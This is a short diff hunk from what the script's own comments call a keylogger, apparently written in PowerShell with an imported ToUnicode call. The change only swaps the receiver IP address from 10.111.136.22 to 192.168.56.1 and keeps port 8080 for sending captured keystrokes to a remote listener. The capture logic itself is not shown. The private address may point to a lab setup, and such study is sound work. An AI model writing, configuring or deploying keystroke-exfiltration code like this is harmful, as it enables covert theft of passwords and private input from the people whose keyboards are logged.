@@ -72,7 +72,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 }
 
 # Set the IP address and port of the receiver
-$receiverIPAddress = 10.111.136.22
+$receiverIPAddress = 192.168.56.1
 $receiverPort = 8080
 
 # Start the keylogger with the specified receiver IP address and port
